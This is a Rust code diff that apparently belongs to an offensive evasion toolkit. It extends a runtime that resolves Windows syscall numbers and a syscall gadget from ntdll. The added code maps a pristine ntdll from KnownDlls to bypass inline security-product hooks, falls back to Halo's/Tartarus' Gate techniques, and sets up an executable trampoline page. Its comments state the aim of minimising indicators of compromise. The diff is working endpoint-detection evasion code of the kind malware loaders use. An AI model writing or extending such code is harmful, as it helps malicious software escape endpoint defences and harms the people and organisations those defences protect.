@@ -43,8 +43,44 @@ impl Runtime {
     /// happen in a real process).
     pub unsafe fn init() -> Option<Self> {
         let ntdll = LiveNtdll::locate()?;
-        let table = ntdll.resolve_table_owned();
-        let syscall_gadget = scan_syscall_gadget(&ntdll)?;
+
+        // Resolve SSN table + gadget. Prefer a FRESH ntdll .text from
+        // \KnownDlls (pristine — defeats inline hooks); fall back to the
+        // hooked in-process ntdll (Halo's/Tartarus' neighbor-walk still
+        // recovers most SSNs there). The fresh map is a strict improvement:
+        // if it fails (KnownDlls ACL / low IL), behavior is unchanged.
+        let mut fresh_guard = FreshMapGuard::default();
+        let (table, syscall_gadget) = match crate::unhook::fresh_ntdll_text() {
+            Some((fresh_base, text_rva, text_size)) => {
+                // Names/RVAs from the hooked ntdll (intact), bytes from the fresh.
+                let owned: Vec<(String, u32)> = ntdll
+                    .exports_iter()
+                    .iter()
+                    .map(|(name, rva)| (name.to_string_lossy(), *rva))
+                    .collect();
+                let src = crate::unhook::FreshTextSource {
+                    fresh_base,
+                    exports: &owned,
+                };
+                let t = nyx_evasion::resolve_table(&src);
+                let g = crate::unhook::scan_syscall_gadget_range(fresh_base, text_rva, text_size);
+                fresh_guard.set(fresh_base); // RAII: unmap on drop (after this block)
+                match g {
+                    Some(gadget) => (t, gadget),
+                    None => {
+                        // Gadget not found in fresh .text (shouldn't happen on a
+                        // real ntdll) — fall back to the hooked scan.
+                        (ntdll.resolve_table_owned(), scan_syscall_gadget(&ntdll)?)
+                    }
+                }
+            }
+            None => {
+                // Fresh map unavailable — use the hooked ntdll as before.
+                (ntdll.resolve_table_owned(), scan_syscall_gadget(&ntdll)?)
+            }
+        };
+        // fresh_guard drops here → unmaps the second ntdll view (transient IOC).
+
         // One page of executable memory. PAGE_EXECUTE_READWRITE (0x40),
         // MEM_COMMIT|MEM_RESERVE (0x3000). Resolved via the PEB walk.
         let va = crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc")?;
@@ -104,6 +140,35 @@ impl Runtime {
         // The trampoline page is 0x1000 bytes; a stub is ~23. Always fits.
         core::ptr::copy_nonoverlapping(stub.as_ptr(), self.trampoline, stub.len());
         self.trampoline as *const u8
+    }
+}
+
+/// RAII guard that unmaps the fresh ntdll view on drop, so the second mapping
+/// is transient (the fresh map is only needed during SSN/gadget resolution —
+/// leaving it mapped is a lingering IOC and a wasted page-aligned region).
+struct FreshMapGuard {
+    base: *mut u8,
+}
+
+impl Default for FreshMapGuard {
+    fn default() -> Self {
+        Self {
+            base: core::ptr::null_mut(),
+        }
+    }
+}
+
+impl FreshMapGuard {
+    fn set(&mut self, b: *mut u8) {
+        self.base = b;
+    }
+}
+
+impl Drop for FreshMapGuard {
+    fn drop(&mut self) {
+        if !self.base.is_null() {
+            unsafe { crate::unhook::unmap_fresh(self.base) };
+        }
     }
 }
 
